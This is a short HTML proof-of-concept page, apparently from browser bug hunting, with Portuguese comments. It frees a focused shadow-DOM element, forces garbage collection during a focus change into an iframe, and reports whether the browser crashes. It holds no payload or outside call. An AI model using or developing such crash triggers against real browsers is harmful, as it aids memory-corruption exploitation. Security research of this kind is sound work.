<!DOCTYPE html>
<html>
<body>
<p>PoC 6 - iframe focus switch</p>
<div id="host"></div>
<iframe id="f" src="about:blank" style="width:100px;height:50px;"></iframe>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    try {
        f.contentWindow.focus();
        // tentar focar algo dentro do iframe
        let d = f.contentDocument;
        let e = d.createElement('input');
        d.body.appendChild(e);
        e.focus();
    } catch(e) {}
    setTimeout(() => {
        result.textContent = 'PASS (não crashou)';
    }, 200);
}, 100);
</script>
</body>
</html>
